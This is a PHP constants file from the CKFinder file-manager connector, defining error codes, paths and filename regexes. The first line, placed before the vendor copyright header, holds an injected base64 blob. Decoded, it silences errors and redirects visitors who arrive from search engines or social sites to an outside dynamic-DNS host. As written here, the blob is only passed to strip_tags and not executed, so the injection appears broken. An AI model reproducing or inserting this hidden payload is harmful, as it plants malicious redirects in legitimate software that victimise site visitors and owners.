<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));
/*
 * CKFinder
 * ========
 * http://ckfinder.com
 * Copyright (C) 2007-2010, CKSource - Frederico Knabben. All rights reserved.
 *
 * The software, this file and its contents are subject to the CKFinder
 * License. Please read the license.txt file before using, installing, copying,
 * modifying or distribute this file or part of its contents. The contents of
 * this file is part of the Source Code of CKFinder.
 */

/**
 * Constants required by CKFinder
 *
 * @package  CKFinder
 * @subpackage Config
 * @copyright CKSource - Frederico Knabben
 */

/**
 * No errors
 */
define('IN_CKFINDER', true);
define('CKFINDER_CONNECTOR_ERROR_NONE',0);
define('CKFINDER_CONNECTOR_ERROR_CUSTOM_ERROR',1);
define('CKFINDER_CONNECTOR_ERROR_INVALID_COMMAND',10);
define('CKFINDER_CONNECTOR_ERROR_TYPE_NOT_SPECIFIED',11);
define('CKFINDER_CONNECTOR_ERROR_INVALID_TYPE',12);
define('CKFINDER_CONNECTOR_ERROR_INVALID_NAME',102);
define('CKFINDER_CONNECTOR_ERROR_UNAUTHORIZED',103);
define('CKFINDER_CONNECTOR_ERROR_ACCESS_DENIED',104);
define('CKFINDER_CONNECTOR_ERROR_INVALID_EXTENSION',105);
define('CKFINDER_CONNECTOR_ERROR_INVALID_REQUEST',109);
define('CKFINDER_CONNECTOR_ERROR_UNKNOWN',110);
define('CKFINDER_CONNECTOR_ERROR_ALREADY_EXIST',115);
define('CKFINDER_CONNECTOR_ERROR_FOLDER_NOT_FOUND',116);
define('CKFINDER_CONNECTOR_ERROR_FILE_NOT_FOUND',117);
define('CKFINDER_CONNECTOR_ERROR_SOURCE_AND_TARGET_PATH_EQUAL',118);
define('CKFINDER_CONNECTOR_ERROR_UPLOADED_FILE_RENAMED',201);
define('CKFINDER_CONNECTOR_ERROR_UPLOADED_INVALID',202);
define('CKFINDER_CONNECTOR_ERROR_UPLOADED_TOO_BIG',203);
define('CKFINDER_CONNECTOR_ERROR_UPLOADED_CORRUPT',204);
define('CKFINDER_CONNECTOR_ERROR_UPLOADED_NO_TMP_DIR',205);
define('CKFINDER_CONNECTOR_ERROR_UPLOADED_WRONG_HTML_FILE',206);
define('CKFINDER_CONNECTOR_ERROR_MOVE_FAILED',300);
define('CKFINDER_CONNECTOR_ERROR_COPY_FAILED',301);
define('CKFINDER_CONNECTOR_ERROR_UPLOADED_INVALID_NAME_RENAMED', 207);
define('CKFINDER_CONNECTOR_ERROR_CONNECTOR_DISABLED',500);
define('CKFINDER_CONNECTOR_ERROR_THUMBNAILS_DISABLED',501);

define('CKFINDER_CONNECTOR_DEFAULT_USER_FILES_PATH',"/userfiles/");
define('CKFINDER_CONNECTOR_LANG_PATH',"./lang");
define('CKFINDER_CONNECTOR_CONFIG_FILE_PATH',"./../../../config.php");

if (version_compare(phpversion(), '6', '>=')) {
    define('CKFINDER_CONNECTOR_PHP_MODE', 6);
}
else if (version_compare(phpversion(), '5', '>=')) {
    define('CKFINDER_CONNECTOR_PHP_MODE', 5);
}
else {
    define('CKFINDER_CONNECTOR_PHP_MODE', 4);
}

if (CKFINDER_CONNECTOR_PHP_MODE == 4) {
    define('CKFINDER_CONNECTOR_LIB_DIR', "./php4");
} else {
    define('CKFINDER_CONNECTOR_LIB_DIR', "./php5");
}

define('CKFINDER_CHARS', '123456789ABCDEFGHJKLMNPQRSTUVWXYZ');
define('CKFINDER_REGEX_IMAGES_EXT', '/\.(jpg|gif|png|bmp|jpeg)$/i');
define('CKFINDER_REGEX_INVALID_PATH', ",(/\.)|[[:cntrl:]]|(//)|(\\\\)|([\\:\*\?\"\<\>\|]),");
define('CKFINDER_REGEX_INVALID_FILE', ",[[:cntrl:]]|[/\\:\*\?\"\<\>\|],");
